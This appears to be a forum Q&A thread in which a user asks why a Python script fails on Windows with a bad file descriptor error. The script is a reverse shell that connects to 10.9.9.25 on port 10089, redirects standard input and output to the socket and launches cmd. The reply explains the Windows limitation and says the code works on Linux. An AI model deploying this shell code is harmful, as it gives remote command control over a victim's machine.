<div class="post-text" itemprop="text">
<p>I want to get my windows shell on my server, I am using the following code.</p>
<pre><code>import socket,os,subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.9.9.25',10089))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(['cmd','/u']);
</code></pre>
<p>I am getting the error</p>
<pre><code>OSError: [Errno 9] Bad file descriptor.
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>If you've read the documentation about <code>socket.fileno()</code> you would know that this won't work in Windows, Quoting from <a href="https://docs.python.org/3/library/socket.html?highlight=socket#module-socket" rel="nofollow">Python Documentation</a>:</p>
<blockquote>
<p><code>socket.fileno()</code></p>
<p>Return the socketâ€™s file descriptor (a small integer). This is useful with select.select().</p>
<p><strong>Under Windows the small integer returned by this method cannot be used where a file descriptor can be used (such as os.fdopen())</strong>. Unix
  does not have this limitation.</p>
</blockquote>
<p><strong>Note:</strong></p>
<p>I've tried your code in Ubuntu (Linux System) and it worked fine without any tweeking.</p>
</div>
<span class="comment-copy"><a href="https://en.wikipedia.org/wiki/Everything_is_a_file" rel="nofollow noreferrer">en.wikipedia.org/wiki/Everything_is_a_file</a> in UNIX, but not in Windows.</span>
